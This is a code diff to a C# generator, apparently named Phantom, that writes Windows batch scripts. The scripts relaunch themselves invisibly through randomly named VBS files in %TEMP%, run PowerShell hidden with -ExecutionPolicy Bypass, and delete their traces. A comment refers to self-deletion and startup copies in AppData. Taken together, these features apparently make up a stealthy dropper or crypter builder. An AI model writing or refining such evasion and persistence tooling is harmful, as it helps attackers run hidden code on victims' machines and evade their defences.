@@ -17,15 +17,14 @@ namespace Phantom
             output.AppendLine("setlocal enableextensions");
 
             string relaunchVbs = null;
-            string psVbs = null;
             string magicFlag = null;
             if (hidden)
             {
                 magicFlag = "_" + Utils.RandomString(3, rng) + "_";
                 relaunchVbs = $"%TEMP%\\{Utils.RandomString(4, rng)}.vbs";
-                psVbs = $"%TEMP%\\{Utils.RandomString(4, rng)}.vbs";
                 output.AppendLine($"if \"%1\"==\"{magicFlag}\" goto main");
-                output.AppendLine($"echo CreateObject(\"Shell.Application\").ShellExecute \"cmd.exe\", \"/c \"\"%~f0\"\" {magicFlag} %*\", \"\", \"open\", 0 > {relaunchVbs}");
+                output.AppendLine($"echo Set s = CreateObject(\"WScript.Shell\") > {relaunchVbs}");
+                output.AppendLine($"echo s.Run \"cmd /c \"\"%~f0\"\" {magicFlag} %*\", 0, False >> {relaunchVbs}");
                 output.AppendLine($"wscript //B {relaunchVbs} >nul 2>&1");
                 output.AppendLine("exit /b");
                 output.AppendLine(":main");
@@ -84,11 +83,13 @@ namespace Phantom
 
             if (hidden)
             {
+                string psVbs = $"%TEMP%\\{Utils.RandomString(4, rng)}.vbs";
                 string qq = "\"\"";
                 output.AppendLine($"set \"_b=%~f0\"");
                 output.AppendLine($"echo Set s = CreateObject(\"WScript.Shell\") > {psVbs}");
-                output.AppendLine($"echo s.Run \"{psPath} -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File {qq}{ps1File}{qq} {qq}%_b%{qq} %*\", 0, True >> {psVbs}");
+                output.AppendLine($"echo s.Run \"{psPath} -NoProfile -ExecutionPolicy Bypass -File {qq}{ps1File}{qq} {qq}%_b%{qq} %*\", 0, True >> {psVbs}");
                 output.AppendLine($"wscript //B {psVbs} >nul 2>&1");
+                output.AppendLine($"del {psVbs} >nul 2>&1");
             }
             else
             {
@@ -100,8 +101,6 @@ namespace Phantom
             output.AppendLine($"del {ps1File} >nul 2>&1");
             if (relaunchVbs != null)
                 output.AppendLine($"del {relaunchVbs} >nul 2>&1");
-            if (psVbs != null)
-                output.AppendLine($"del {psVbs} >nul 2>&1");
 
             // Self-delete (skips startup copies in AppData)
             if (selfdelete)
